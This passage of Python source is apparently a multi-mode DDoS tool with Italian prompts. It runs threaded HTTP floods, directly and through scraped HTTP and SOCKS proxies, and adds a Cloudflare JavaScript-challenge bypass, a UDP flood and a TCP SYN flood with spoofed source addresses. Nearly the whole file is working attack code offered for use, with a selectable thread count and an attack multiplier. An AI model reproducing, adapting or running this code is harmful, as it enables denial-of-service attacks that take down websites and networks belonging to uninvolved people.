    proxies = open(out_file).readlines()
    print("[!] Get Proxies Successfully ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    logo()
    numthreads()
def start_mode():
    global choice_mode, filenam1, filenam2, method_pass_cf
    print("""

[✫]=====[Layer 7 ]===========[✫]===========[ Layer 4 ]======[✫]
[✫]=========================================================[✫]                                          
[✫]〘0〙: Home      [ HOME ]    〘4〙: Raw-DoS       [ Home ] [✫]
[✫]〘1〙: Proxy     [ DDoS ]    〘5〙: UDP Flood     [ Home ] [✫]
[✫]〘2〙: Socks     [ DDoS ]    〘6〙: TCP-SYN Flood [ DDos ] [✫]
[✫]〘3〙: JS-Normal [ Home ]    〘7〙: Stop       [ctrl+alt+c][✫]
[✫]=========================================================[✫]
""")
    choice_mode = input("[*] Attack Mode [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
    elif choice_mode == "1":
        choice_mode = "1"
        filenam1 = "proxy"
        filenam2 = "Proxy"
        logo()
        choice_down_proxies()
    elif (choice_mode == "2") or (choice_mode == ""):
        choice_mode = "2"
        filenam1 = "socks"
        filenam2 = "Socks"
        logo()
        choice_down_proxies()
    elif choice_mode == "3":
        print("-----------------------------")
        print("|_--> 1: Method Bypass v1")
        print("|_--> 2: Method Bypass v2")
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[?] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[!] Selected Method Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("[!] Selected Method Bypass JS v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
        filenam2 = "Raw-DoS"
        logo()
        numthreads()
    elif choice_mode == "5":
        filenam2 = "UDP Flood"
        logo()
        numthreads()
    elif choice_mode == "6":
        filenam2 = "TCP-SYN Flood"
        logo()
        numthreads()
    else:
        print ("[!] Hai sbagliato a digitare, prova di nuovo [!]\n")
        start_mode()

error_cf = int(0)

def pass_cf():
    global user, cookie, soso, scraper, error_cf
    if "https" in url:
        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
    try:
        if method_pass_cf == "1":
            cookie, user = cfscrape.get_cookie_string(url)
        else:
            scraper = cfscrape.create_scraper()
            soso    = scraper.get(url, timeout=15)
        print("[!] Bypass Has Been Completed!")
        numthreads()
    except:
        error_cf += 1
        print("[!] Bypassing Again... [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[!] ERROR BYPASS\n[!] Seleziona un altro attacco o ignora il metodo[!]")
            start_mode()
        else:
            pass_cf()

def choice_method_attack():
    global method_attack, name_method_attack
    print("-----------------------------")
    print("|_--> 1: Request [ Normal ]")
    print("|_--> 2: Request [  Spam  ]")
    method_attack = input("[*] Choice Request [1/2]: ")
    if (method_attack == "1") or (method_attack == ""):
        name_method_attack = "Normal"
        print("[!] Metodo scelto Attacco normale")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print("[!] Metodo scelto Attacco Spam")
    else:
        print ("[!] Hai sbagliato a digitare, prova di nuovo [!]\n")
        choice_method_attack()
    logo()
    start_mode()

def choice_down_proxies():
    global urlproxy, urlproxy, sel_pr
    choice4 = input("[?] Ottieni un nuovo elenco " +str(filenam2)+ " [Y/N]: ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: Server X")
        print("|_--> 2: Server Z")
        sel_pr = input("[?] Server Get [1/2]: ")
        if choice_mode == "proxy":
            if sel_pr == "1":
                urlproxy = "https://www.proxy-list.download/api/v1/get?type=http"
            else:
                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000&country=all&ssl=yes&anonymity=all"
        else:
            if sel_pr == "1":
                urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
            else:
                urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        proxyget()
    else:
        print("[!] Seleziona la la nuova lista " +str(filenam2)+ " [!]")
        proxies_list()


def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (3000): "))
	except ValueError:
		threads = 3000
		print ("3000 threads selected.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Inserisci un numero di moltiplicazione per l'attacco [(1-5=normale)(50=potente)(100 o più=bomba)]: "))
	except ValueError:
		print("Hai sbagliato a digitare, prova di nuovo...\n")
		multiplication()
	begin()


#def numthreads():
 #   global threads
  #  try:
   #     print("-----------------------------")
    #    threads = int(input("[*] Threads [3000]: "))
    #except ValueError:
     #   threads = int(3000)
      #  print ("[!] Selected Threads " +str(threads)+ " [!]\n")
    #logo()
    #begin()
#--------------------------------------------------------------------------->
def begin():
    choice6 = input('=*= Press "Enter" to start attack: ')
    if choice6 == "":
        #webbrowser.open("http...", new=0, autoraise=True)
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("[+] Pronti all'attacco------>")
            sleep(3)
        attack()
        print()
    else:
        sys.exit()
#----------------------------------------------------------------------------->
def attack():
    global threads, get_host, acceptall, connection, content, length, x, req_code, error, max_req, multiple
    x     = int(0)
    error = int(0)
    req_code = int(0)
    multiple = int(100)
    connection = "Connection: Keep-Alive\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    if choice_mode == "0":
        for x in range(threads):
            Home(x+1).start()
    elif choice_mode == "1":
        for x in range(threads):
            Proxy(x+1).start()
    elif choice_mode == "2":
        for x in range(threads):
            Socks(x+1).start()
    elif choice_mode == "3":
        if method_pass_cf == "1":
            for x in range(threads):
                JSv1(x+1).start()
        else:
            for x in range(threads):
                JSv2(x+1).start()
    elif choice_mode == "4":
        for x in range(threads):
            raw_dos(x+1).start()
    elif choice_mode == "5":
        for x in range(threads):
            udpflood()
    elif choice_mode == "6":
        for x in range(threads):
            synflood(x+1).start()

class raw_dos(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        global req_code, error
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : random.choice(useragents),
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
        if method_attack == "1":
            requests.get(url, headers=headersx)
        else:
            requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
        while True:
            try:
                if method_attack == "1":
                    requests.get(url, headers=headersx)
                else:
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] Attacco DDoS| Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
                                requests.get(url, headers=headersx)
                            else:
                                requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                    except:
                        try:
                            pass
                        except:
                            pass
            except:
                try:
                    pass
                except:
                    pass

class Proxy(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            request  = get_host + useragent + accept + referer + forward + content + length + connection + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                
                req_code += 1 
                sys.stdout.write("[!] DDoS attacco | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                sys.stdout.flush()
                
                print("[!] DDoS attacco | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        req_code += 1
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    proxy = random.choice(proxies).strip().split(":")
                except:
                    pass

class Socks(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            request  = get_host + useragent + accept + referer + content + length + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] DDoS attacco| Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                except:
                    pass
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(host_url), int(port)))
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print(" DDos attacco| Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        try:
                            s.close()
                        except:
                            pass
                except:
                    try:
                        s.close()
                        proxy = random.choice(proxies).strip().split(":")
                    except:
                        pass

class Home(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + content + length + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] DDoS attacco | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                req_code += 1
                sys.stdout.write("[!] DDoS attacco | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        req_code += 1
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass

class JSv1(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
        http = urllib3.PoolManager()

    def run(self):
        global req_code, error
        http = urllib3.PoolManager()
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : user,
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
        "Cookie" : cookie}
        while True:
            try:
                if method_attack == "1":
                    http.request("GET", url, headers=headersx)
                else:
                    http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] DDoS attacco | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass

class JSv2(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
        scraper = cfscrape.create_scraper()

    def run(self):
        global req_code, error
        scraper = cfscrape.create_scraper()
        while True:
            try:
                if method_attack == "1":
                    soso = scraper.get(url, timeout=15)
                else:
                    soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                print("[+] DDoS attacco | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                req_code += 1
                try:
                    for y in range(multiple):
                        req_code += 1
                        if method_attack == "1":
                            soso = scraper.get(url, timeout=15)
                        else:
                            soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass


####################################################################
from urllib.request import urlopen
html = urlopen("http://www.google.com/").read()
try:
    import cookielib
except:
    import http.cookiejar
    cookielib = http.cookiejar

cookielib.debug = lambda *a: None
from socket import setdefaulttimeout
####################################################################

def udpflood():
    global req_code, error
    tar = (str(host_ip),int(port))
    bytes = random._urandom(1180) #1475
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
                    req_code += 1
                    sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
                    sys.stdout.flush()
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass
        except:
            try:
                s.close()
                error += 1
            except:
                pass
#########################################################################################################################

class synflood(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        while True:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)
        
            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = host_url
        
            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            try:
                send(IP_Packet/TCP_Packet, verbose=0)
                req_code += 1
            except:
                try:
                    error += 1
                except:
                    pass
####################
            sys.stdout.write("[+] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
####################
if __name__ == '__main__':
    start_url()
    #####aggionamento momentaneo######
